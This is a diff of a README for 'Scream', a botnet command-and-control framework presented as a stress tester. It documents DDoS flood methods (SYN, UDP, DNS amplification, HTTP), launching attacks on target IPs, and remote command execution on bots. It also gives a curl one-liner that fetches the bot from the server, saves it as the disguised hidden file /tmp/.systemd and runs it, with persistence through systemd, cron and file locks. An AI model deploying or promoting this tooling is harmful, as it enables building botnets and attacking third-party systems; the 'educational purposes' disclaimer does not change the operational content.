@@ -16,93 +16,89 @@ Scream is a lightweight Command and Control (C2) framework with integrated stres
 
 ## Features
 
-### Web-based Management Interface
-- Real-time bot monitoring  
-- Attack control panel  
-- User management system  
-- Attack history tracking  
+### ✅ Web-Based Interface
+- Real-time bot monitoring
+- Attack control panel
+- User management system
+- Attack history tracking
 
-### Stress Testing Capabilities
-- UDP Flood  
-- TCP Flood  
-- SYN Flood  
-- ACK Flood  
-- GRE Flood  
-- DNS Amplification  
-- HTTP Flood  
+### 🚀 Stress Testing Modules
+- UDP Flood
+- TCP Flood
+- SYN Flood
+- ACK Flood
+- GRE Flood
+- DNS Amplification
+- HTTP Flood
 
-### Bot Management
-- Automatic bot connection handling  
-- Heartbeat monitoring  
-- Hardware resource reporting  
-- Remote command execution  
+### 🧠 Bot Management
+- Auto bot connection handling
+- Heartbeat & status monitoring
+- Hardware resource reporting
+- Remote command execution
 
-### Security Features
-- Challenge-response authentication  
-- TLS encrypted communications  
-- Session management  
-- Password complexity enforcement  
+### 🔐 Security
+- Challenge-response authentication
+- TLS encrypted communication
+- Session & password management
+- Enforced password complexity
 
 ---
 
 ## Installation
 
-### Prerequisites
-- Go 1.18+ installed  
-- Basic server with root access  
-- Domain name (recommended for SSL)  
+### Requirements
+- Go 1.18+ installed
+- Root access to a Linux server
+- Domain name (recommended for SSL)
 
-### Quick Start
+### Quick Setup
 
-**Clone the repository:**
-```bash
-git clone https://github.com/yourusername/scream-c2.git
-cd scream-c2
-```
+1. **Clone the repository**
+   ```bash
+   git clone https://github.com/yourusername/scream-c2.git
+   cd scream-c2
+   ```
 
-**Build the server and bot:**
-```bash
-go build -o server main.go
-go build -o bot bot.go
-```
+2. **Build server and bot**
+   ```bash
+   go build -o server main.go
+   go build -o bot bot.go
+   ```
 
-**Generate SSL certificates (if needed):**
-```bash
-./server --gen-cert
-```
+3. **Generate SSL certificates**
+   ```bash
+   ./server --gen-cert
+   ```
 
-**Start the server:**
-```bash
-./server
-```
+4. **Run the server**
+   ```bash
+   ./server
+   ```
 
-**Deploy the bot to target systems.**
+5. **Deploy bots to desired systems**
 
 ---
 
 ## Configuration
 
-### Server Configuration
-The server can be configured by modifying the constants in `main.go`:
-
+### Server Settings (`main.go`)
 ```go
 const (
-    USERS_FILE          = "users.json"         // User database file
-    BOT_SERVER_IP       = "0.0.0.0"            // Bot connection interface
-    BOT_SERVER_PORT     = "7003"               // Bot connection port
-    WEB_SERVER_IP       = "0.0.0.0"            // Web interface interface
-    WEB_SERVER_PORT     = "443"                // Web interface port
-    CERT_FILE           = "server.crt"         // SSL certificate
-    KEY_FILE            = "server.key"         // SSL private key
+    USERS_FILE      = "users.json"
+    BOT_SERVER_IP   = "0.0.0.0"
+    BOT_SERVER_PORT = "7003"
+    WEB_SERVER_IP   = "0.0.0.0"
+    WEB_SERVER_PORT = "443"
+    CERT_FILE       = "server.crt"
+    KEY_FILE        = "server.key"
 )
 ```
 
-### Bot Configuration
-Modify the C2 address in `bot.go`:
-
+### Bot Settings (`bot.go`)
 ```go
 const (
-    C2Address = "your.server.ip:7003" // Change to your server's IP/domain
+    C2Address = "your.server.ip:7003"
 )
 ```
 
@@ -110,81 +106,71 @@ const (
 
 ## Usage
 
-### Accessing the Web Interface
-Navigate to `https://your-server-ip` in your browser
+### Web Dashboard
+- Visit: `https://your-server-ip`
+- Default Login:
+  - **Username**: `root`
+  - **Password**: *(auto-generated, shown on first run)*
 
-**Login with the default credentials:**
-- **Username:** `root`
-- **Password:** *(generated on first run, check console output)*
+### Manage Bots
+- View all connected bots and their statuses
+- Access detailed hardware/resource reports
+- Execute remote commands
 
-### Managing Bots
-- The dashboard shows all connected bots  
-- View bot details by clicking on a bot in the list  
-- Monitor bot status (active/inactive) via the status indicator  
+### Launch Attacks
+1. Select a method
+2. Enter target details
+3. Define duration
+4. Click **"Initiate Attack Sequence"**
 
-### Launching Attacks
-- Select an attack method from the dropdown  
-- Enter the target IP/hostname  
-- Specify the target port  
-- Set the duration (in seconds)  
-- Click **"Initiate Attack Sequence"**
-
-### User Management
-Admin/Owner users can:
-- Create new users  
-- Delete existing users  
-- Modify user access levels  
+### Manage Users
+- Create, delete, or modify users (Admin role only)
 
 ---
 
-## Security Considerations
+## Deployment Options
 
-⚠️ **Important Security Notes:**
-- Change the default root password immediately after first login  
-- Use strong, complex passwords for all user accounts  
-- Restrict access to the web interface (firewall rules, VPN, etc.)  
-- Regularly monitor and audit user activity  
-- Keep the server software updated  
-
----
-
-## Bot Deployment
-
-### Linux Deployment
-
+### Linux Bot Deployment
 ```bash
-# Download and execute
 curl http://your-server-ip/bot -o /tmp/.systemd && chmod +x /tmp/.systemd && /tmp/.systemd
 ```
 
 ### Persistence Methods
-The bot includes several persistence mechanisms:
-- Systemd service  
-- Cron job  
-- File locking (prevent deletion)  
+- Systemd service
+- Cron job
+- File lock to prevent deletion
 
 ---
 
 ## Troubleshooting
 
-### Common Issues
+### Bots not connecting?
+- Double-check `C2Address` in the bot binary
+- Ensure server ports are open and listening
+- Review firewall or security group settings
 
-#### Bots not connecting:
-- Verify the C2 address in the bot binary  
-- Check firewall rules on the server  
-- Ensure the bot server is running on the correct port  
+### Web interface not loading?
+- Verify SSL certificate paths
+- Confirm port 443 is accessible
+- Check server logs for errors
 
-#### Web interface not loading:
-- Verify SSL certificates are properly configured  
-- Check if the web server is running  
-- Ensure port 443 (or your configured port) is open  
+### Attacks not effective?
+- Confirm target IP/hostname and port
+- Ensure bots are online
+- Verify method compatibility
 
-#### Attack not working:
-- Verify target IP/port is correct  
-- Check if bots are properly connected  
-- Ensure the attack method is appropriate for the target  
+---
+
+## Security Best Practices
+⚠️ **Important:**
+- Change the default `root` password immediately
+- Use strong, unique passwords for all users
+- Restrict dashboard access (VPN, firewall, etc.)
+- Keep the system and Go packages updated
+- Regularly audit bot activity and logs
 
 ---
 
 ## License
-This software is provided for educational and research purposes only. The authors are not responsible for any misuse of this tool.
+**For educational and research purposes only.**  
+The authors are **not responsible** for any misuse or unauthorized use of this tool.
